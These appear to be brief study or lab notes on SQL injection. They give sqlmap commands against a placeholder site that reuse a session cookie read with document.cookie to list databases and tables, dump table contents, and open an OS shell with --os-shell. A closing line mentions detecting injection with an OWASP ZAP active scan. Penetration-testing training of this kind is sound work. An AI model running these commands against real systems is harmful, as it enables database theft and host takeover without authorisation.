# SQL Injection

## Sqlmap

**Perform an SQL Injection Attack Against MSSQL to Extract Databases using sqlmap**

copy the whole cookie from the console on the website after login 

```jsx
document.cookie 
```

after that to show all databases

```bash
sqlmap -u "http://websiteurl.com/?parameter=123" --cookie="paste cookie copied from above" --dbs
```

after that to show all tables

```bash
sqlmap -u "http://websiteurl.com/?parameter=123" --cookie="paste cookie copied from above" -D <databasename> --tables
```

after that to show the content of a table

```bash
sqlmap -u "http://websiteurl.com/?parameter=123" --cookie="paste cookie copied from above" -D <databasename> -T <Tablename> --dump
```

To get the OS shell

```bash
sqlmap -u "http://websiteurl.com/?parameter=123" --cookie="paste cookie copied from above" --os-shell
```

## OWASP ZAP

**Detect SQL Injection Vulnerabilities using OWASP ZAP**

Using active scan of the tool identify this